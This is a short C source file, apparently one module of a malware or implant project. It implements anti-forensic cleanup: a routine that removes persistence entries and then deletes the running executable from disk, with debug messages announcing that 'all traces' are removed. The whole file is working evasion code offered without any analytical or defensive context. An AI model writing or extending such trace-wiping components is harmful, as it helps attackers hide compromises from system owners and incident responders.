#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define MODULE_TAG "cleanup"
#include "headers/debug.h"

#include "headers/cleanup.h"
#include "headers/persist.h"

static void cleanup_self_delete(void) {
    char exe[512] = {0};
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len > 0) {
        exe[len] = '\0';
        if (!strstr(exe, "(deleted)")) {
            unlink(exe);
            DEBUG_PRINT("Self-deleted: %s", exe);
        }
    }
}

void cleanup_full_wipe(void) {
    DEBUG_PRINT("cleanup_full_wipe: starting full trace removal");

    persist_remove_all();
    cleanup_self_delete();

    DEBUG_PRINT("cleanup_full_wipe: complete - all traces removed");
}
